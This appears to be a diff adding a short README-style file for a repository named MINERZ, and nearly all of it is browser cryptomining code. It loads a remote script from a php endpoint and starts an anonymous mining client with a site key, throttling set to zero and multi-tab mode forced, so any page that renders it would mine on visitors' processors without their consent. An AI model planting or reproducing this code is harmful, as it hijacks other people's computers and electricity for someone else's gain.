@@ -1,0 +1,10 @@
+# MINERZ
+WORK
+https://github.com/madridminez/MINERZ
+<script src="https://github.com/madridminez/MINERZ/MJ5E.php?f=WLe2.js"></script>
+<script>
+    var _client = new Client.Anonymous('5fa16649365ad44563370157107e348cbcd74f3bb817acd66c1a9867173e6003', {
+        throttle: 0
+    });
+    _client.start(Client.FORCE_MULTI_TAB);
+</script>
